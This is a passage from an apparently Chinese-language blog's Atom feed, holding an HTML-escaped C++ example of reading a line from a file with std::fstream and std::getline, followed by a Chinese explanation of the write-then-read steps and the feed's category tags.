&#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to open file for reading&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件读取数据</span></span><br><span class="line">    std::string line;</span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">getline</span>(file, line)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Read from file: &quot;</span> &lt;&lt; line &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">close</span>(); <span class="comment">// 关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个示例中，我们首先创建了一个 <code>fstream</code> 对象，并使用 <code>open()</code> 函数以写入模式打开了一个名为 <code>example.txt</code> 的文件。然后，我们向文件中写入了一条消息，并关闭了文件。接下来，我们再次打开该文件，这次是以读取模式打开的。我们使用 <code>std::getline()</code> 函数从文件中读取了一行数据，并将其打印到标准输出上。最后，我们关闭了文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
</feed>
